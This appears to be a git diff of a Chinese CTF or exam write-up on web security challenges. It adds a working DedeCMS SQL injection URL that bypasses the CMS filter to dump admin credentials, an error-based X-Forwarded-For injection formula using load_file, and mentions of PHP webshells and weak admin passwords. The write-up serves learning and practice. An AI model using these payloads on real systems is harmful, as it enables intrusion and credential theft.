@@ -267,7 +267,6 @@ admin_name,5,6,7,pwd,9%20FROM qs_admin
   `<?php system("ls")?>`
   最后查找了一下，得到key。
 
-
 3. Top 100 弱口令
 
   这个题目有三种解法，第一种是利用弱口令字典爆破。
@@ -293,11 +292,26 @@ admin_name,5,6,7,pwd,9%20FROM qs_admin
   需要注意的是得到的密码并不是一个标准的Md5值，需要把前面3位和后面1位去掉，解密后拿到密码，
   进入后台。发现index.html模板页面已经被写入了一句话，连接后拿到key.
 
-  网上看了一些dedecms的注入过程，还不是很懂，有空学习一下再写。
+  注入点在`http://ip/plus/recommend.php`
+
+  看了网上资料后一步步构造了
+  ```
+  http://ip/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111
+  ```
+
+  其中
+  ```
+  mid开头和结尾的@`\%27`
+
+  select和union关键字要有/*!50000*/包含
+  ```
+  是为了绕过dedecms中的防注入机制，否则会被拦截.
+
+  ![dedecms_safe_query.png](imgs/dedecms_safe_query.png)
 
 5. 入门从这里开始
 
-  打开是一个"野草CMS"，随手输入admin.php进入后台页面，又随手输入admin\admin。直接进入后台。
+  打开是一个"野草CMS"，随手输入admin.php进入后台页面，又随手输入admin、admin。直接进入后台。
 
   编辑模板页面发现有许多页面已经写入了一句话。但是菜刀连不上，于是到index.html页面，
   重新写入一句话，菜刀连接后拿到Key。
@@ -382,8 +396,25 @@ admin_name,5,6,7,pwd,9%20FROM qs_admin
 
 3. X-Forwarded注入
 
-  这道题简直虐心，可能是注入类题目中最难得一个了，其中考察了报错注入。
-  有空再补。
+  这个题目开始是个简单的登陆框，输入任意账号密码登陆后显示登录失败，然后给出当前登录IP。
+
+  ![X-Forwarded_index.png](imgs/X-Forwarded_index.png)
+
+  ![X-Forwarded_login_failed](imgs/X-Forwarded_login_failed.png)
+
+  在POST中加入`X-Forwarded-For: 127.0.0.1'`后出现SQL报错语句，确定注入点。
+
+  *因为考试时间的问题，没有能重现题目，我按照记忆说一下。*
+
+  这个题目是要求通过报错注入来完成。报错注入一般可以套用公式`and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)--'`，其中的原理是count()、rand()、group by 三个语句之间的矛盾造成的报错，《冰眼安全》的公众号有过这个详细解释。但我不明白的是我在我本地使用`select count(*),concat(floor(rand(0)*2),database())x from information_schema.tables group by x`可以得到database()的值，但是在有些环境中却没有爆出数据库，必须要加入很多个select才能得到。一直没有找到相关解释，应该是我数据库知识太缺乏的缘故吧。
+
+  ![error_sql.png](imgs/error_sql.png)
+
+  题目中虽然可以使用报错语句来拿到登陆账号密码,分别是admin/admin、1/1、Starbucks/Starbucks，但是登陆以后并没有相关提示，而是又直接回到了登陆界面。估计是出题人不愿意看到大家使用工具来完成题目。
+
+  随后又经过了多个尝试，确定了这个题目的解题是利用Mysql中的`load_file`函数来查看KEY文件值。于是我开始疯狂的找默认路径下的文件，还是没有拿到网站的物理路径。两天后直接认怂，问了其他人才知道网站的路径是存在于`C:\wwwroot\`，把`C:\wwwroot\`转换成十六进制，`load_file(hex(C:\wwwroot\key.php))`得到Key.
+
+  随后我把index.php文件也取出来看了一下，发现里面有个判断提交的字符串是否为字母加数字组合的函数`ctype_alnum()`。也就是说，如果用户提交的用户密码为字母+数字则可以查询数据库，与数据库中一致就得到Key。如果只是提交单一的字母或者数字则不会与数据库进行比对，会弹回到登陆界面，这就是为什么我们把用户库爆出来以后还拿不到key的原因。换个思路来说，如果我在报错注入的语句中新插入一个用户，账号密码符合`ctype_alnum()`也可以获得key值的。
 
 4. 通用型防注入程序设计缺陷利用
 
